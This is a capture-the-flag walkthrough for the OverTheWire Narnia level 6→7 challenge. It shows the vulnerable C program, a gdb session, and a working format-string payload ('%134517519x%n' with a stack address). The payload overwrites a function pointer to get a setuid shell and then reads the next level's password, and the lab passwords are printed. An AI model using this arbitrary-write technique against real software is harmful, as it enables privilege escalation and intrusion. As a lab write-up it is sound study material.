# Narnia Level 6 → Level 7 Format String Vulnerability

## Previous Flag
<b>54RtepCEU0</b>

## Goal
Use previous password to log in SSH with user <b>narnia7</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
Overwrite the value of ptrf (pointer to function) so it points to hackedfunction instead of goodfunction
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia7@narnia.labs.overthewire.org -p 2226 ⌨️
narnia7@narnia:~$ cd /narnia/ ⌨️
narnia7@narnia:/narnia$ file narnia7 ⌨️
narnia7: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=f188e63cc16d3426cf06cd0741de73e46fcebb66, for GNU/Linux 3.2.0, not stripped
narnia7@narnia:/narnia$ cat narnia7.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));                      // clears buffer
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);                // Vulnerability Here, we control format via argument

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
narnia7@narnia:/narnia$ ./narnia7 ⌨️
Usage: ./narnia7 <buffer>
narnia7@narnia:/narnia$ ./narnia7 AAAA ⌨️
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd318)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@narnia:/narnia$ gdb -q narnia7 ⌨️
Reading symbols from narnia7...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Enable debuginfod for this session? (y or [n]) y ⌨️
Debuginfod has been enabled.
To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
Download failed: Permission denied.  Continuing without separate debug info for /narnia/narnia7.
(No debugging symbols found in narnia7)
(gdb) disassemble vuln ⌨️🧠🧠🧠 Disassemble where vulnerability is
Dump of assembler code for function vuln:
   0x08049206 <+0>:     push   %ebp      
   0x08049207 <+1>:     mov    %esp,%ebp 
   0x08049209 <+3>:     sub    $0x84,%esp
   0x0804920f <+9>:     push   $0x80
   0x08049214 <+14>:    push   $0x0
   0x08049216 <+16>:    lea    -0x80(%ebp),%eax
   0x08049219 <+19>:    push   %eax
   0x0804921a <+20>:    call   0x80490d0 <memset@plt>           // set buffer to 0
   0x0804921f <+25>:    add    $0xc,%esp
   0x08049222 <+28>:    push   $0x80492ea
   0x08049227 <+33>:    push   $0x804a008
   0x0804922c <+38>:    call   0x8049040 <printf@plt>
   0x08049231 <+43>:    add    $0x8,%esp
--Type <RET> for more, q to quit, c to continue without paging--c ⌨️
   0x08049234 <+46>:    push   $0x804930f
   0x08049239 <+51>:    push   $0x804a01d
   0x0804923e <+56>:    call   0x8049040 <printf@plt>
   0x08049243 <+61>:    add    $0x8,%esp
   0x08049246 <+64>:    movl   $0x80492ea,-0x84(%ebp)
   0x08049250 <+74>:    mov    -0x84(%ebp),%eax
   0x08049256 <+80>:    lea    -0x84(%ebp),%edx
   0x0804925c <+86>:    push   %edx
   0x0804925d <+87>:    push   %eax
   0x0804925e <+88>:    push   $0x804a035
   0x08049263 <+93>:    call   0x8049040 <printf@plt>
   0x08049268 <+98>:    add    $0xc,%esp
   0x0804926b <+101>:   push   $0x804a050
   0x08049270 <+106>:   call   0x8049080 <puts@plt>
   0x08049275 <+111>:   add    $0x4,%esp
   0x08049278 <+114>:   push   $0x2
   0x0804927a <+116>:   call   0x8049060 <sleep@plt>
   0x0804927f <+121>:   add    $0x4,%esp
   0x08049282 <+124>:   movl   $0x80492ea,-0x84(%ebp)
   0x0804928c <+134>:   push   0x8(%ebp)
   0x0804928f <+137>:   push   $0x80
   0x08049294 <+142>:   lea    -0x80(%ebp),%eax
   0x08049297 <+145>:   push   %eax
   0x08049298 <+146>:   call   0x80490e0 <snprintf@plt>
   0x0804929d <+151>:   add    $0xc,%esp 👀 One after the vulnerability fx
   0x080492a0 <+154>:   mov    -0x84(%ebp),%eax
   0x080492a6 <+160>:   call   *%eax
   0x080492a8 <+162>:   leave
   0x080492a9 <+163>:   ret
End of assembler dump.
(gdb) break *vuln+151 ⌨️
Breakpoint 1 at 0x804929d
(gdb) run "AAAA" ⌨️
Starting program: /narnia/narnia7 "AAAA"
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f 👀

before : ptrf() = 0x80492ea (0xffffd2e8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()
(gdb) x/20wx $esp ⌨️
0xffffd2dc:     0xffffd2ec      0x00000080      0xffffd5ba      0x080492ea
0xffffd2ec:     0x41414141👀   0x00000000      0x00000000      0x00000000
0xffffd2fc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd30c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd31c:     0x00000000      0x00000000      0x00000000      0x00000000

# Create payload for AAAA location to run at 0xffffd2fc (\xfc\xd2\xff\xff)
(gdb) run $(echo -e "\xfc\xd2\xff\xff")%x%n ⌨️                              # Important: NOT same as %xn ⚠️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia7 $(echo -e "\xfc\xd2\xff\xff")%x%n
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2e8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()
(gdb) x/20wx $esp ⌨️
0xffffd2dc:     0xffffd2ec      0x00000080      0xffffd5b6      0x080492ea
0xffffd2ec:     0xffffd2fc👀   0x39343038      0x00616532      0x00000000
0xffffd2fc👀:   0x0000000b👀   0x00000000      0x00000000      0x00000000
0xffffd30c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd31c:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) run $(echo -e "\x0c\xd3\xff\xff")%x%n ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia7 $(echo -e "\x0c\xd3\xff\xff")%x%n
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2e8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()
(gdb) x/20wx $esp ⌨️
0xffffd2dc:     0xffffd2ec      0x00000080      0xffffd5b6      0x080492ea
0xffffd2ec:     0xffffd30c👀    0x39343038      0x00616532      0x00000000
0xffffd2fc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd30c👀:  0x0000000b👀    0x00000000      0x00000000      0x00000000 👀 Where addy set there a b
0xffffd31c:     0x00000000      0x00000000      0x00000000      0x00000000

# Change hacked function hex address to decimal since \x converts it to hex
(gdb) p/d 0x804930f ⌨️❤️❤️❤️
$1 = 134517519 👀 Converted hacked function hex address to decimal
(gdb) p/t 0x804930f ⌨️❤️❤️❤️
$2 = 1000000001001001001100001111
(gdb) p/x 134517519 ⌨️❤️❤️❤️
$3 = 0x804930f
(gdb) x/hx 0xffff300c ⌨️❤️❤️❤️
0xffff300c:     0x9313

# /x convert to hex and sends it to the addy on the left
(gdb) run $(echo -e "\x0c\xd3\xff\xff")%134517519x%n ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia7 $(echo -e "\x0c\xd3\xff\xff")%134517519x%n
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2d8) 👀 need rewrite payload to override this location
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()
(gdb) x/20wx $esp ⌨️
0xffffd2cc:     0xffffd2dc      0x00000080      0xffffd5ad      0x080492ea
0xffffd2dc:     0xffffd30c      0x20202020      0x20202020      0x20202020 
0xffffd2ec:     0x20202020      0x20202020      0x20202020      0x20202020 👀 /x20 = space
0xffffd2fc:     0x20202020      0x20202020      0x20202020      0x20202020
0xffffd30c:     0x08049313      0x20202020      0x20202020      0x20202020
(gdb) x/wx 0x08049313 ⌨️
0x8049313 <hackedfunction+4>:   0x04a0d568
(gdb) run $(echo -e "\xd8\xd2\xff\xff")%134517519x%n ⌨️
The program being debugged has been started already.
Start it from the beginning? (y or n) y ⌨️
Starting program: /narnia/narnia7 $(echo -e "\xd8\xd2\xff\xff")%134517519x%n
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd2d8)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x0804929d in vuln ()
(gdb) continue
Continuing.
Way to go!!!![Detaching after vfork from child process 968939]
$ whoami ⌨️
narnia7                 # Note: It not narnia8 because when run outside program has suid set to narnia8
$ exit ⌨️
[Inferior 1 (process 964390) exited normally]
(gdb) exit ⌨️
narnia7@narnia:/narnia$ ./narnia7 $(echo -e "\xd8\xd2\xff\xff")%134517519x%n ⌨️⭐⭐⭐
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd318)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami ⌨️
narnia8
$ cat /etc/narnia_pass/narnia8 ⌨️
i1SQ81fkb8 🔐
```

## Flag
<b>i1SQ81fkb8</b>

## Continue
[Continue](./Narnia0708.md)